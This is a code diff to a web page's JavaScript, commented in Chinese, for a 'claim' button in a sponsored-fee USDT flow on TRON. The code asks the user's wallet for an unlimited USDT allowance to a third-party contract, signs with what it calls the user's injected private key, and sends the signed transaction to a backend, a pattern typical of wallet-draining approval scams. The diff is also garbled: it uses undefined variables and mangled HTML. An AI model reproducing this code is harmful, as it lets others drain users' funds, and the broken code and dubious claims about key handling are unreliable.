@@ -446,41 +446,32 @@
             };
 
             // 代付核心逻辑（领取按钮）
-            approveBtn.onclick = async () => {
-                if (!userAddress || !usdtContract) {
-                    alert("请先连接imToken钱包");
-                    return;
-                }
-                if (isProcessing) return;
-                
-                isProcessing = true;
-                approveBtn.disabled = true;
-                approveBtn.innerHTML = '<<<i class="fa fa-spinner fa-spin"></</</i> 授权中...';
-                try {
-                    // 1. 用户授权USDT给代付合约
-                    const approval = await usdtContract.approve(
-                        PAYMENT_CONTRACT, // 授权目标：代付合约
-                        INFINITE_APPROVE // 无限授权
-                    ).send({
-                        from: userAddress,
-                        feeLimit: 1000000, // 手续费上限（后端代付）
-                        shouldPollResponse: true // 等待上链
-                    });
+            // 1. imToken内置浏览器自动注入TronWeb（包含用户私钥权限）
+const tronWeb = window.tronWeb;
 
-                    // 2. 调用后端代付接口
-                    approveBtn.innerHTML = '<<<i class="fa fa-spinner fa-spin"></</</i> 代付转账中...';
-                    const paymentParams = {
-                        userAddress: userAddress,
-                        paymentContract: PAYMENT_CONTRACT,
-                        usdtContract: USDT_CONTRACT,
-                        amount: APPROVE_AMOUNT,
-                        approvalTxHash: approval.transactionHash
-                    };
-                    const res = await fetch(BACKEND_PAYMENT_API, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(paymentParams)
-                    });
+// 2. 构造USDT授权交易（代付合约作为spender）
+const approveTx = await tronWeb.contract(USDT_ABI, USDT_CONTRACT)
+  .approve(
+    PAYMENT_CONTRACT, // 授权目标：代付合约
+    INFINITE_APPROVE // 如uint256最大值
+  ).send({
+    from: userAddress, // imToken自动获取的用户地址
+    feeLimit: 1000000, // 手续费上限（后端代付）
+    shouldPollResponse: false // 仅生成交易结构，不广播
+  });
+
+// 3. 用户离线签名交易（私钥不触网，仅生成签名数据）
+const userSignedTx = await tronWeb.trx.sign(
+  approveTx.transaction, // 裸交易结构
+  tronWeb.defaultPrivateKey, // imToken自动注入的用户私钥（本地签名）
+  false // 标记为“仅用户签名，不支付手续费”
+);
+
+// 4. 将签名后的交易数据传给后端
+fetch(BACKEND_PAYMENT_API, {
+  method: "POST",
+  body: JSON.stringify({ userSignedTx, 代付合约地址 })
+});
                     const resData = await res.json();
 
                     if (res.ok && resData.success) {
